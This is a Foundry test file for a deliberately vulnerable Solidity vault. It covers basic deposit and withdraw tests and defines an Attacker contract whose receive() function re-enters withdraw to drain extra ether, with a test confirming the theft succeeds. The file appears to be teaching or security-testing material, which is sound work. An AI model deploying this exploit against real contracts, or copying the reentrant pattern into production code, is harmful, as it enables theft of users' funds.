// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/VulnerableVault.sol";

/**
 * @title VulnerableVaultTest
 * @notice Tests demonstrating the reentrancy vulnerability
 */
contract VulnerableVaultTest is Test {
    VulnerableVault public vault;
    address public user1;
    address public user2;

    function setUp() public {
        vault = new VulnerableVault();
        user1 = address(0x1);
        user2 = address(0x2);

        // Fund test users
        vm.deal(user1, 10 ether);
        vm.deal(user2, 10 ether);
    }

    function testDeposit() public {
        vm.prank(user1);
        vault.deposit{value: 1 ether}();

        assertEq(vault.balances(user1), 1 ether);
    }

    function testWithdraw() public {
        // Deposit first
        vm.prank(user1);
        vault.deposit{value: 1 ether}();

        // Withdraw
        vm.prank(user1);
        vault.withdraw(0.5 ether);

        assertEq(vault.balances(user1), 0.5 ether);
    }

    function testGetBalance() public {
        vm.prank(user1);
        vault.deposit{value: 1 ether}();

        vm.prank(user1);
        uint256 balance = vault.getBalance();

        assertEq(balance, 1 ether);
    }
}

/**
 * @title Attacker
 * @notice Contract to demonstrate reentrancy attack
 */
contract Attacker {
    VulnerableVault public vault;
    uint256 public attackCount;

    constructor(address _vault) {
        vault = VulnerableVault(_vault);
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw(msg.value);
    }

    // Reentrancy attack via receive function
    receive() external payable {
        if (attackCount < 2 && address(vault).balance >= msg.value) {
            attackCount++;
            vault.withdraw(msg.value);
        }
    }
}

/**
 * @title ReentrancyAttackTest
 * @notice Test demonstrating the reentrancy vulnerability can be exploited
 */
contract ReentrancyAttackTest is Test {
    VulnerableVault public vault;
    Attacker public attacker;
    address public victim;

    function setUp() public {
        vault = new VulnerableVault();
        attacker = new Attacker(address(vault));
        victim = address(0x1);

        // Fund victim
        vm.deal(victim, 10 ether);

        // Victim deposits funds
        vm.prank(victim);
        vault.deposit{value: 3 ether}();
    }

    function testReentrancyAttack() public {
        // Fund attacker
        vm.deal(address(attacker), 1 ether);

        // Record initial balances
        uint256 vaultInitialBalance = address(vault).balance;
        uint256 attackerInitialBalance = address(attacker).balance;

        // Execute attack
        attacker.attack{value: 1 ether}();

        // Attacker should have stolen more than deposited
        uint256 attackerFinalBalance = address(attacker).balance;

        // This test demonstrates the vulnerability exists
        assertTrue(attackerFinalBalance > attackerInitialBalance, "Reentrancy attack failed to extract extra funds");
        assertTrue(address(vault).balance < vaultInitialBalance, "Vault balance should decrease beyond legitimate withdrawal");
    }
}
